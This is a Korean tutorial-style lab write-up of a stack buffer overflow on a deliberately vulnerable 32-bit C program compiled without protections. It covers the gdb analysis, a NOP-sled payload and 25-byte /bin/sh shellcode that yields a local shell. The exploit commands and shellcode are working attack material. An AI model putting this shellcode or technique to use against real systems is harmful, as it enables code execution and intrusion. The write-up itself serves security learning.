# Buffer Overflow란?

**Buffer Overflow**는 C언어나 C++에서 버퍼에 데이터를 입력 받을 때 **입력 값의 크기를 검증하지 않아** 
버퍼가 흘러 넘쳐 다른 변수나 메모리를 덮어 씌우게 되는 버그이다.   
이 취약점을 이용해 **Return address**를 원하는 주소로 덮어 씌워 **IP(Instruction Pointer)를 제어**할 수 있게 된다.   
Buffer Overflow에는 **Stack Overflow**와 **Heap Overflow**가 있다.

## 실습
``` C
# include <stdio.h>
# inslucd <string.h>

int main(int argc, char *argv[])
{
    char buf[256];
    
    strcpy(buf, argv[1]);
    printf("%s\n", buf);
}
```
**strcpy 함수**로 argv[1]을 buf로 복사하고 printf로 출력한다.   
여기서 취약점은 **strcpy** 함수에서 발생한다.   
strcpy 함수는 null byte(문자열의 끝)를 만날 때까지 문자열을 복사하는 함수이다. 즉, 복사하는 버퍼의 크기를 검증하지 않는 취약한 함수이다.   
그래서 buf의 크기인 256byte를 훨씬 넘는 데이터도 buf에 복사할 수 있게 된다.

```
oojin@ubuntu:~/Study/System/BOF$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -no-pie -o bugfile1 bugfile1.c
yoojin@ubuntu:~/Study/System/BOF$ ls
bugfile1  bugfile1.c
yoojin@ubuntu:~/Study/System/BOF$ ./bugfile1 AAAA
AAAA
```
32bit로 컴파일 시켰다. AAAA를 입력하면 AAAA가 출력되는 그런 형식이다.

```
yoojin@ubuntu:~/Study/System/BOF$ gdb -q bugfile1
Reading symbols from bugfile1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x100 //0x100은 10진수로 256
   0x08048444 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048447 <+12>:	add    eax,0x4
   0x0804844a <+15>:	mov    eax,DWORD PTR [eax]
   0x0804844c <+17>:	push   eax
   0x0804844d <+18>:	lea    eax,[ebp-0x100]
   0x08048453 <+24>:	push   eax
   0x08048454 <+25>:	call   0x8048300 <strcpy@plt>
   0x08048459 <+30>:	add    esp,0x8
   0x0804845c <+33>:	lea    eax,[ebp-0x100]
   0x08048462 <+39>:	push   eax
   0x08048463 <+40>:	call   0x8048310 <puts@plt>
   0x08048468 <+45>:	add    esp,0x4
   0x0804846b <+48>:	mov    eax,0x0
   0x08048470 <+53>:	leave  
   0x08048471 <+54>:	ret    
End of assembler dump.
```

gdb로 bugfile1을 분석해 보았다. main함수를 disassemble하면 위와 같다.
main+3에서 stack을 0x100만큼 확장하였다.(변수 할당)   

RET(4)   
SFP(4)   
buf(256)   

buf가 256byte, SFP가 4byte 그리고 RET(Return address)이니 260 byte를 넘게 입력하면 RET가 덮일 것이다.   
./bugfile1 $(python -c 'print("A" * 264)')를 입력하였을 때, Return address가 덮여서 segmantation fautl가 났다.   
이때 EIP는 0x41414141로 덮인 상태이다.   
이제 쉘 코드를 메모리 어딘가에 넣어서 공격을 하면 된다.   
bugfile1은 argv[1]을 buf로 복사하니, agrv[1]에 넣고 Return address를 buf의 주소로 덮어씌우면 된다.   
buf의 주소를 찾아보겠다.   
main+33 지점이 strcpy 함수가 끝나는 시점이니 이곳에 break를 걸고 디버깅 해 보았다.

```
(gdb) b* main+33
Breakpoint 1 at 0x804845c
(gdb) r $(python -c 'print("A"*264)')
Starting program: /home/yoojin/Study/System/BOF/bugfile1 $(python -c 'print("A"*264)')

Breakpoint 1, 0x0804845c in main ()
(gdb) x/70wx $esp
0xffffce38:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffce48:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffce58:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffce68:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffce78:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffce88:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffce98:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcea8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffceb8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcec8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffced8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcee8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcef8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf08:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf18:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf28:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf38:	0x41414141	0x41414141	0x00000000	0xffffcfd4
0xffffcf48:	0xffffcfe0	0x00000000
```

스택에 argv[1]에 입력한 A 264개가 들어 있다.
buf의 주소는 ** 0xffffce38** 이다.

이제 argv[1]에 쉘코드를 넣고 RET 전까지 채운 후, buf 주소를 넣으면 된다.
하지만 buf의 주소가 정확하지 않을 수도 있기 때문에 **NOP Slide** 또는 ** NOP Sled** 라는 기법을 사용하면 성공 확률을 높일 수 있다.

쉘 코드는 /bin/sh를 실행시키는 25byte 코드를 사용하였다.
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

**NOP(100)+SELLCODE(25)+NOP(131)+SFP(4)+RET(4)**
이렇게 하면 된다.

```
yoojin@ubuntu:~/Study/System/BOF$ ./bugfile1 $(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*135+"\x38\xce\xff\xff")')
����������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���
                                          ���������������������������������������������������������������������������������������������������������������������������������������8���
Segmentation fault (core dumped)
```

공격이 실패했다. 이유는 gdb에서 분석시에 buf의 주소와 실제 시행 시에 buf의 주소가 차이가 나기 떄문이다.
bugfile1의 소스 코드르 조금 수정하여 실제  buf 주소가 무엇인지 확인 해 보았다.

``` C
# include <stdio.h>
# inslucd <string.h>

int main(int argc, char *argv[])
{
    char buf[256];
    
    strcpy(buf, argv[1]);
    printf("%s\n", buf);
    printf("%p\n", buf);
}
```

printf 함수로 buf의 주소를 출력해보았다.

```
yoojin@ubuntu:~/Study/System/BOF$ ./bugfile1 $(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*135+"\x38\xce\xff\xff")')
����������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���
                                          ���������������������������������������������������������������������������������������������������������������������������������������x���
0xffffce78
```

실제 buf의 주소는 **0xffffce78**이었다.

```
yoojin@ubuntu:~/Study/System/BOF$ ./bugfile1 $(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*135+"\x78\xce\xff\xff")')
����������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���
                                          ���������������������������������������������������������������������������������������������������������������������������������������x���
0xffffce78
$ id
uid=1000(yoojin) gid=1000(yoojin) groups=1000(yoojin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

실제 주소인 **0xffffce78**로 다시 exploit을 시도해보았더니 성공하였다.
